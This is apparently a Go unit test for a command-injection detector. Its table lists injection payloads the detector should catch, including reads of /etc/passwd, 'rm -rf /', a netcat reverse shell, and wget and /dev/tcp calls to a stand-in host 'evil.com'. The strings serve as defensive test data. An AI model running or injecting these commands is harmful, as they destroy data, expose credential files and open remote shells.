// Copyright (c) 2026 erik <erik@erik.xyz> — https://erik.xyz

package injection

import "testing"

func TestCommand(t *testing.T) {
	d := &Command{}
	tests := []struct {
		input  string
		should bool
	}{
		{"`cat /etc/passwd`", true},
		{"$(whoami)", true},
		{"| cat /etc/passwd", true},
		{"system('rm -rf /')", true},
		{"&& wget evil.com", true},
		{"; ls -la", true},
		{"|| nc -e /bin/sh", true},
		{"ping -c 4 127.0.0.1", true},
		{"nslookup evil.com", true},
		{"/dev/tcp/evil.com/8080", true},
		{">/dev/null 2>&1", true},
		{"normal text", false},
		{"hello world", false},
	}
	for _, tc := range tests {
		r := d.Detect(tc.input)
		if r.Detected != tc.should {
			t.Errorf("input=%q: got detected=%v, want %v", tc.input, r.Detected, tc.should)
		}
	}
}
